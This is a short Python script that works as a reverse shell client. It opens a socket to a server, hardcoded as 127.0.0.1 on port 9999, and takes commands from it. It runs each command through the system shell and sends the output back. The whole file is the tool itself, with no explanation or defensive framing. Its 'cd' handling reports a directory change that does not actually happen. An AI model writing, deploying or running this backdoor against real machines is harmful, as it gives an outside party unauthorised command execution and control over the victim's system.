import socket
import subprocess

def connect_to_server(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))

    while True:
        # Get the command from the server
        command = client.recv(1024).decode()

        if command.lower() == 'exit':
            break

        if command.startswith('cd'):
            try:
                # Change the directory
                subprocess.call(command, shell=True)
                client.send(b'Changed directory\n')
            except Exception as e:
                client.send(str(e).encode())
            
        
        else:
            # Execute another commands
            output = subprocess.run(command, shell=True, capture_output=True)
            client.send(output.stdout + output.stderr)

    client.close()

if __name__ == "__main__":
    connect_to_server('127.0.0.1', 9999)